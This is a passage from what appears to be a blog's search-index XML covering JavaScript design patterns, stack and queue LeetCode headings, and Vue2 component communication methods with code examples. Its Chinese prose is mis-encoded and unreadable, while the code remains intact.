class="keyword">this</span>.subject.getState()&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> Subject();</span><br><span class="line"><span class="keyword">let</span> o1 = <span class="keyword">new</span> Observer(<span class="string">"o1"</span>, s);</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="keyword">new</span> Observer(<span class="string">"o2"</span>, s);</span><br><span class="line"></span><br><span class="line">s.setState(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p>nodejsè‡ªå®šä¹‰äº‹ä»¶<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> EventEmitter = <span class="built_in">require</span>(<span class="string">'events'</span>).EventEmitter;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">extends</span> <span class="title">EventEmitter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> simon = <span class="keyword">new</span> Dog(<span class="string">'simon'</span>);</span><br><span class="line">simon.on(<span class="string">'bark'</span>, () =&gt; &#123; <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> bark`</span>)&#125;)</span><br><span class="line">simon.on(<span class="string">'bark'</span>, () =&gt; &#123; <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span> another bark`</span>)&#125;)</span><br><span class="line">simon.emit(<span class="string">'bark'</span>);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-7-è¿­ä»£å™¨æ¨¡å¼"><a href="#2-7-è¿­ä»£å™¨æ¨¡å¼" class="headerlink" title="2.7 è¿­ä»£å™¨æ¨¡å¼"></a>2.7 è¿­ä»£å™¨æ¨¡å¼</h4><p>é¡ºåºè®¿é—®ä¸€ä¸ªé›†åˆã€‚ES6ä¸­æœ‰åºé›†åˆçš„æ•°æ®ç±»å‹æœ‰å¾ˆå¤š: Array, Map, Set, String, TypedArray, arguments, NodeListï¼Œéœ€è¦ä¸€ä¸ªç»Ÿä¸€çš„éå†æ¥å£æ¥éå†è¿™äº›æ•°æ®ç±»å‹ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="keyword">let</span> nodeList = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'p'</span>)</span><br><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">m.set(<span class="string">'a'</span>, <span class="number">100</span>)</span><br><span class="line">m.set(<span class="string">'b'</span>, <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">each</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> iterator = data[<span class="built_in">Symbol</span>.iterator](); <span class="comment">// es6ä¸­ä¸Šé¢è¿™äº›æ•°æ®ç±»å‹éƒ½æœ‰è¿™ä¸ªå±æ€§</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> item = &#123; <span class="attr">done</span>: <span class="literal">false</span> &#125;;</span><br><span class="line">    <span class="keyword">while</span>(!item.done) &#123;</span><br><span class="line">        item = iterator.next();</span><br><span class="line">        <span class="keyword">if</span> (!item.done)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(item.value)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// es6ä¸­ç›´æ¥ä½¿ç”¨ for..of..ä¸ç”¨è‡ªå·±å®šä¹‰è¿­ä»£å™¨</span></span><br><span class="line">    <span class="comment">// for ( let item of data ) &#123;</span></span><br><span class="line">    <span class="comment">//     console.log(item)</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">each(arr)</span><br><span class="line">each(nodeList)</span><br><span class="line">each(m)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-8-å…¶ä»–æ¨¡å¼"><a href="#2-8-å…¶ä»–æ¨¡å¼" class="headerlink" title="2.8 å…¶ä»–æ¨¡å¼"></a>2.8 å…¶ä»–æ¨¡å¼</h4><ul><li>çŠ¶æ€æœºæ¨¡å¼ï¼šä¸€ä¸ªå¯¹è±¡æœ‰çŠ¶æ€å˜åŒ–ï¼Œæ¯æ¬¡çŠ¶æ€å˜åŒ–éƒ½ä¼šè§¦å‘ä¸€ä¸ªé€»è¾‘ï¼Œå¦‚Promise</li></ul><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.im/post/5a4353766fb9a044fb080927" target="_blank" rel="noopener">Vue ç»„ä»¶é€šä¿¡ä¹‹ Bus</a></li></ul>]]></content>
      
      <categories>
          
          <category> Basic </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æ ˆã€é˜Ÿåˆ—</title>
      <link href="/2019/08/22/Leetcode-%E6%A0%88/"/>
      <url>/2019/08/22/Leetcode-%E6%A0%88/</url>
      <content type="html"><![CDATA[<h3 id="1-æ•°æ®ç»“æ„"><a href="#1-æ•°æ®ç»“æ„" class="headerlink" title="1. æ•°æ®ç»“æ„"></a>1. æ•°æ®ç»“æ„</h3><ul><li><p>æ ˆ Stack<br>å…ˆå…¥åå‡ºçš„å®¹å™¨ç»“æ„ï¼Œå…ˆè¿›æ¥çš„å…ƒç´ å åœ¨ä¸€èµ·ï¼Œä¸èƒ½ä»åé¢å‡ºæ¥å…ƒç´ </p></li><li><p>é˜Ÿåˆ— Queue<br>å…ˆè¿›å…ˆå‡ºï¼Œæ’é˜Ÿ</p></li><li><p>åŒç«¯é˜Ÿåˆ— Deque<br>å¯ä»¥ä»å‰åä¸¤ç«¯è¿›å‡º</p></li></ul><p>JSå®ç°è¿™æ ·çš„æ•°æ®ç»“æ„ï¼Œä¼šç”¨æ•°ç»„æ¨¡æ‹Ÿï¼ŒåŠ ä¸Š<code>push</code>, <code>pop</code>, <code>search</code>æ–¹æ³•</p><h3 id="2-LeetCode"><a href="#2-LeetCode" class="headerlink" title="2. LeetCode"></a>2. LeetCode</h3><h4 id="2-1-æœ‰æ•ˆçš„æ‹¬å·"><a href="#2-1-æœ‰æ•ˆçš„æ‹¬å·" class="headerlink" title="2.1 æœ‰æ•ˆçš„æ‹¬å·"></a>2.1 æœ‰æ•ˆçš„æ‹¬å·</h4><h4 id="æœ€å°æ ˆ"><a href="#æœ€å°æ ˆ" class="headerlink" title="æœ€å°æ ˆ"></a>æœ€å°æ ˆ</h4><h4 id="æ»‘åŠ¨çª—å£æœ€å¤§å€¼"><a href="#æ»‘åŠ¨çª—å£æœ€å¤§å€¼" class="headerlink" title="æ»‘åŠ¨çª—å£æœ€å¤§å€¼"></a>æ»‘åŠ¨çª—å£æœ€å¤§å€¼</h4><h4 id="æŸ±çŠ¶å›¾ä¸­æœ€å¤§çš„çŸ©å½¢"><a href="#æŸ±çŠ¶å›¾ä¸­æœ€å¤§çš„çŸ©å½¢" class="headerlink" title="æŸ±çŠ¶å›¾ä¸­æœ€å¤§çš„çŸ©å½¢"></a>æŸ±çŠ¶å›¾ä¸­æœ€å¤§çš„çŸ©å½¢</h4><h4 id="æ¥é›¨æ°´"><a href="#æ¥é›¨æ°´" class="headerlink" title="æ¥é›¨æ°´"></a>æ¥é›¨æ°´</h4>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vue2 ç»„ä»¶é€šä¿¡çš„å¤šç§æ–¹å¼</title>
      <link href="/2019/08/21/vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/"/>
      <url>/2019/08/21/vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/</url>
      <content type="html"><![CDATA[<blockquote><p>ç»„ä»¶é€šä¿¡æ–¹å¼éƒ½æœ‰å“ªäº›ï¼Ÿå“ªç§æ¯”è¾ƒå¥½ï¼Ÿ</p></blockquote><h3 id="1-å„ç§é€šä¿¡æ–¹å¼çš„ä¼˜åŠ£åŠ¿"><a href="#1-å„ç§é€šä¿¡æ–¹å¼çš„ä¼˜åŠ£åŠ¿" class="headerlink" title="1. å„ç§é€šä¿¡æ–¹å¼çš„ä¼˜åŠ£åŠ¿"></a>1. å„ç§é€šä¿¡æ–¹å¼çš„ä¼˜åŠ£åŠ¿</h3><ul><li><p><em><code>props</code></em><br>çˆ¶ç»„ä»¶å‘å­ç»„ä»¶ä¼ å€¼ï¼Œä¸é€‚åˆå¤šå±‚çº§å…³ç³»ï¼Œå¤šå±‚çº§ä¼ å€¼å†™æ³•å†—ä½™</p></li><li><p><em><code>$on, $emit</code></em><br>å­ç»„ä»¶å‘çˆ¶ç»„ä»¶é€šä¿¡</p></li><li><p><em><code>v-model: props + $emit</code></em><br>props å’Œ $emitç»“åˆï¼Œå°±æ˜¯v-modelåŒå‘ç»‘å®š</p></li><li><p><em><code>prarent/children/ref</code></em><br>çˆ¶ç»„ä»¶è°ƒç”¨å­ç»„ä»¶æ–¹æ³•ï¼Œå…„å¼Ÿç»„ä»¶é€šä¿¡</p></li><li><p><em><code>provide/inject</code></em><br>é€‚ç”¨äºä¸€ä¸ªæ•°æ®æœ‰å¤šä¸ªå­ç»„ä»¶åœ¨åŒæ—¶ä½¿ç”¨ï¼Œå¦‚æäº¤ä¸€ä¸ªå¤æ‚è¡¨å•<br>ï¼ˆ è¦æ³¨æ„ï¼Œ<code>provide</code>å’Œ<code>inject</code>ç»‘å®šå¹¶ä¸æ˜¯å¯å“åº”çš„ï¼Œä½ å¿…é¡»<code>watch</code>æ¥å®ç°å“åº” ï¼‰</p></li><li><p><em><code>eventBus/$on/$emit</code></em><br>ç”¨å¾—å°‘ï¼Œå±‚çº§æ·±å…¥å¤æ‚ï¼Œä¸”ç»„ä»¶ä¹‹é—´æ²¡æœ‰å•¥å…³ç³»ã€‚è¦è®©ä»–ä»¬é€šä¿¡ï¼Œå¦‚æœæ˜¯æ˜¯åœ¨å°é¡¹ç›®ä¸­ï¼ŒEventBuså°±æ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ã€‚</p></li><li><p><em><code>$attrs/$listeners</code></em><br>å¯¹å±‚çº§ä¸æ·±çš„ç»„ä»¶å…³ç³»ï¼Œæ€ä¹ˆä¼ å€¼ï¼Ÿattrsè·Ÿlistenersæ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ã€‚ä»–çš„ä¸­é—´ç»„ä»¶ï¼Œå¯ä»¥ä¸å—å½±å“ï¼Œå»ä¼ é€’ç»™å­å­™ç»„ä»¶ã€‚</p></li><li><p><em><code>vuex</code></em><br>å…³äºå…¨å±€ç¼“å­˜å˜é‡çš„å‚¨å­˜ï¼Œåœ¨ä¼ ç»Ÿæ—¶ä»£ï¼Œæ ¹æ®cookies,localstorage,sessionç­‰ï¼ŒåŸºæœ¬å¯ä»¥å®Œæˆå˜é‡çš„å­˜å‚¨ã€‚ä½†æ˜¯åœ¨æ•°æ®é©±åŠ¨çš„æ—¶ä»£ï¼Œæ‰€æœ‰çš„æ•°æ®éœ€è¦åŒå‘ç»‘å®šæ‰èƒ½å®Œæˆæ•°æ®é©±åŠ¨ï¼Œä½†æ˜¯æ˜æ˜¾cookiesï¼Œlocalstorageï¼Œsessionç­‰ï¼Œæ— æ³•å®ŒæˆåŒå‘ç»‘å®šã€‚è¿™æ—¶å°±è¦ç”¨åˆ° vuexï¼Œreduxç­‰ï¼Œæä¾›<em>å…¨å±€çŠ¶æ€ç®¡ç†</em>ï¼Œ<em>æŒä¹…åŒ–å¤„ç†</em>ã€‚</p></li></ul><p><br></p><h3 id="1-props"><a href="#1-props" class="headerlink" title="1. props"></a>1. props</h3><p>çˆ¶ç»„ä»¶å‘å­ç»„ä»¶ä¼ é€æ•°æ®<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;child :value=<span class="string">"value"</span> /&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-on-emit"><a href="#2-on-emit" class="headerlink" title="2. $on, $emit"></a>2. $on, $emit</h3><p>å­ç»„ä»¶å‘çˆ¶ç»„ä»¶é€šä¿¡ã€‚å­ç»„ä»¶é€šè¿‡æ´¾å‘äº‹ä»¶ï¼Œç»™çˆ¶ç»„ä»¶å‘æ¶ˆæ¯<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;child @sendMsg=<span class="string">"getChildMsg"</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.$emit(<span class="string">"sendMsg"</span>,<span class="keyword">this</span>.msg)</span><br></pre></td></tr></table></figure></p><h3 id="3-v-model-sync"><a href="#3-v-model-sync" class="headerlink" title="3. v-model, .sync"></a>3. v-model, .sync</h3><p>åŒå‘ç»‘å®š<code>v-model</code>æ˜¯props + $emitçš„ç»“åˆã€‚<br>å­ç»„ä»¶ä¸èƒ½ç›´æ¥ä¿®æ”¹<code>props</code>ï¼Œå­ç»„ä»¶éœ€è¦é€šè¿‡<code>$emit</code>å‘é€äº‹ä»¶çš„æ–¹å¼è®©çˆ¶ç»„ä»¶ä¿®æ”¹<code>props</code>ã€‚<br>v-model<code>ä¼šè§£ææˆåä¸º</code>value<code>çš„</code>prop<code>å’Œåä¸º</code>@input`çš„äº‹ä»¶ã€‚å…¶æ ¹æœ¬ï¼Œè¿˜æ˜¯é€šè¿‡äº‹ä»¶çš„æ–¹å¼è®©çˆ¶ç»„ä»¶ä¿®æ”¹æ•°æ®ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v-model</span></span><br><span class="line">&lt;child v-model=<span class="string">"value"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// v-modelç­‰åŒäº</span></span><br><span class="line">&lt;input :value=<span class="string">"value"</span> @input=<span class="string">"handlerChange"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// v-modelå¤šä¸ªå€¼ï¼Œå¯ä»¥è‡ªå®šä¹‰å€¼ï¼ˆå€¼ä¸åªæ˜¯valueï¼‰</span></span><br><span class="line">&lt;child :page.sync=<span class="string">"page"</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line">&lt;input :page=<span class="string">"page"</span> @update:page=<span class="string">"v =&gt; page = v"</span> /&gt;</span><br><span class="line"><span class="keyword">this</span>.$emit(<span class="string">"update:page"</span>, newVal)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-attrs-listeners"><a href="#4-attrs-listeners" class="headerlink" title="4. $attrs/$listeners"></a>4. $attrs/$listeners</h3><p>å¤šå±‚åµŒå¥—ç»„ä»¶ä¼ é€’æ•°æ®æ—¶ï¼Œå¦‚æœåªæ˜¯ä¼ é€’æ•°æ®ï¼Œè€Œä¸åšä¸­é—´å¤„ç†çš„è¯å°±å¯ä»¥ç”¨è¿™ä¸ªï¼Œæ¯”å¦‚çˆ¶ç»„ä»¶å‘å­™å­ç»„ä»¶ä¼ é€’æ•°æ®æ—¶<br><code>$attrs</code>ï¼šåŒ…å«çˆ¶ä½œç”¨åŸŸé‡Œé™¤ class å’Œ style é™¤å¤–çš„é props å±æ€§é›†åˆ<br><code>$listeners</code>ï¼šåŒ…å«çˆ¶ä½œç”¨åŸŸé‡Œ .native é™¤å¤–çš„ç›‘å¬äº‹ä»¶é›†åˆ<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Parent.vue</span></span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;child :name=<span class="string">"name"</span> title=<span class="string">"1111"</span> &gt;<span class="xml"><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br><span class="line"><span class="regexp">export default&#123;</span></span><br><span class="line"><span class="regexp">    data()&#123;</span></span><br><span class="line"><span class="regexp">        return &#123;</span></span><br><span class="line"><span class="regexp">            name:"æ²å"</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ Child.vue</span></span><br><span class="line"><span class="regexp">&lt;template&gt;</span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ ç»§ç»­ä¼ ç»™å­™å­ç»„ä»¶</span></span><br><span class="line"><span class="regexp">    &lt;sun-child v-bind="$attrs"&gt;&lt;/</span>sun-child&gt;</span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br><span class="line"><span class="regexp">export default&#123;</span></span><br><span class="line"><span class="regexp">    props:["name"], /</span><span class="regexp">/ è¿™é‡Œå¯ä»¥æ¥æ”¶ï¼Œä¹Ÿå¯ä»¥ä¸æ¥æ”¶</span></span><br><span class="line"><span class="regexp">    mounted()&#123;</span></span><br><span class="line"><span class="regexp">        /</span><span class="regexp">/ å¦‚æœpropsæ¥æ”¶äº†name å°±æ˜¯ &#123; title:1111 &#125;ï¼Œå¦åˆ™å°±æ˜¯&#123; name:"æ²å", title:1111 &#125;</span></span><br><span class="line"><span class="regexp">        console.log(this.$attrs)</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-parent-chilren-refs"><a href="#5-parent-chilren-refs" class="headerlink" title="5. $parent, $chilren, $refs"></a>5. $parent, $chilren, $refs</h3><p>åœ¨<code>this.$parent.children</code>ä¸­é€šè¿‡ç»„ä»¶<code>name</code>æŸ¥è¯¢åˆ°éœ€è¦çš„ç»„ä»¶å®ä¾‹ï¼Œé€šè¿‡ ref ä¸»åŠ¨è·å–å­ç»„ä»¶çš„å±æ€§æˆ–è€…è°ƒç”¨å­ç»„ä»¶çš„æ–¹æ³•<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;child ref=<span class="string">"child"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">child</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child = <span class="keyword">this</span>.$refs.child</span><br><span class="line"><span class="built_in">console</span>.log(child.name) <span class="comment">// nameæ˜¯childçš„data</span></span><br><span class="line">child.someMethod(<span class="string">"è°ƒç”¨äº†å­ç»„ä»¶çš„æ–¹æ³•"</span>) <span class="comment">// someMethodæ˜¯childçš„methods</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-provide-inject"><a href="#6-provide-inject" class="headerlink" title="6. provide/inject"></a>6. provide/inject</h3><p>Provide å¯ä»¥åœ¨ç¥–å…ˆç»„ä»¶ä¸­æŒ‡å®šæˆ‘ä»¬æƒ³è¦æä¾›ç»™åä»£ç»„ä»¶çš„æ•°æ®å’Œæ–¹æ³•ï¼Œåœ¨ä»»ä½•åä»£ç»„ä»¶ä¸­ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ç”¨ Inject æ¥æ¥æ”¶ Provide æä¾›çš„æ•°æ®å’Œæ–¹æ³•ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// çˆ¶ç»„ä»¶</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">    <span class="comment">// æ–¹æ³•ä¸€ ä¸èƒ½è·å– this.xxxï¼Œåªèƒ½ä¼ å†™æ­»çš„</span></span><br><span class="line">    provide:&#123;</span><br><span class="line">        name:<span class="string">"æ²å"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// æ–¹æ³•äºŒ å¯ä»¥è·å– this.xxx</span></span><br><span class="line">    provide()&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            name:<span class="string">"æ²å"</span>,</span><br><span class="line">            msg: <span class="keyword">this</span>.msg <span class="comment">// data ä¸­çš„å±æ€§</span></span><br><span class="line">            someMethod:<span class="keyword">this</span>.someMethod <span class="comment">// methods ä¸­çš„æ–¹æ³•</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">        someMethod()&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"è¿™æ˜¯æ³¨å…¥çš„æ–¹æ³•"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åä»£ç»„ä»¶</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">    inject:[<span class="string">"name"</span>,<span class="string">"msg"</span>,<span class="string">"someMethod"</span>],</span><br><span class="line">    mounted()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.msg) <span class="comment">// è¿™é‡Œæ‹¿åˆ°çš„å±æ€§ä¸æ˜¯å“åº”å¼çš„ï¼Œå¦‚æœéœ€è¦æ‹¿åˆ°æœ€æ–°çš„ï¼Œå¯ä»¥åœ¨ä¸‹é¢çš„æ–¹æ³•ä¸­è¿”å›</span></span><br><span class="line">        <span class="keyword">this</span>.someMethod()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-Event-Bus"><a href="#7-Event-Bus" class="headerlink" title="7. Event Bus"></a>7. Event Bus</h3><p>newä¸€ä¸ªVueå®ä¾‹ï¼Œä½œä¸ºäº‹ä»¶æ€»çº¿ï¼Œåƒæ˜¯æ‰€æœ‰ç»„ä»¶å…±ç”¨ç›¸åŒçš„äº‹ä»¶ä¸­å¿ƒï¼Œå¯ä»¥å‘è¯¥ä¸­å¿ƒæ³¨å†Œå‘é€äº‹ä»¶æˆ–æ¥æ”¶äº‹ä»¶ï¼Œ æ‰€ä»¥ç»„ä»¶éƒ½å¯ä»¥é€šçŸ¥å…¶ä»–ç»„ä»¶ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Vue.prototype.bus = <span class="keyword">new</span> Vue();</span><br><span class="line">Vue.component(<span class="string">'child'</span>, &#123;</span><br><span class="line">  methods: &#123;</span><br><span class="line">    handleClick: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.bus.$emit(<span class="string">'change'</span>, <span class="string">'content'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.bus.$on(<span class="string">'change'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(msg); <span class="comment">// 'content'</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-Vuex"><a href="#7-Vuex" class="headerlink" title="7. Vuex"></a>7. Vuex</h3><p>åˆå§‹åŒ–vuexçš„æ—¶å€™ï¼Œæ–°å»ºäº†ä¸€ä¸ªvue å®ä¾‹<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123; <span class="attr">data</span>: &#123; <span class="attr">$store</span>: store &#125; &#125;)</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œä¼šç»™storeè®¾ç½®get/setï¼Œç„¶åæŠŠ store æŒ‚åˆ° Vue.prototypeä¸Šï¼Œåªè¦è®¿é—® this.$store.xxxå°±ä¼šæ”¶é›†ä¾èµ–ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/store.js </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resetStoreVM</span> (<span class="params">store</span>) </span>&#123;</span><br><span class="line">  store._vm = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">      $$state: state</span><br><span class="line">    &#125;,</span><br><span class="line">    computed</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/53218851" target="_blank" rel="noopener">ã€VueåŸç†ã€‘Props - ç™½è¯ç‰ˆ</a></li><li><a href="https://cn.vuejs.org/v2/guide/components-props.html" target="_blank" rel="noopener">Prop</a></li><li><a href="https://cn.vuejs.org/v2/guide/components-custom-events.html#sync-%E4%BF%AE%E9%A5%B0%E7%AC%A6" target="_blank" rel="noopener">.sync ä¿®é¥°ç¬¦</a></li><li><a href="https://juejin.cn/post/6844903887162310669#heading-11" target="_blank" rel="noopener">vueä¸­8ç§ç»„ä»¶é€šä¿¡æ–¹å¼</a></li><li><a href="https://www.jianshu.com/p/d95a7b8afa06" target="_blank" rel="noopener">vuexå·¥ä½œåŸç†è¯¦è§£</a></li><li><a href="https://tech.meituan.com/2017/04/27/vuex-code-analysis.html" target="_blank" rel="noopener">Vuexæ¡†æ¶åŸç†ä¸æºç åˆ†æ</a></li><li><a href="https://juejin.cn/post/6999687348120190983?searchId=2025030615330979E6E38D7849AE670496#heading-16" target="_blank" rel="noopener">Vue3çš„8ç§å’ŒVue2çš„12ç§ç»„ä»¶é€šä¿¡ï¼Œå€¼å¾—æ”¶è—</a></li></ul>]]></content>
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æ•°ç»„ã€é“¾è¡¨ã€è·³è¡¨</title>
      <link href="/2019/08/19/LeetCode-%E6%95%B0%E7%BB%84/"/>
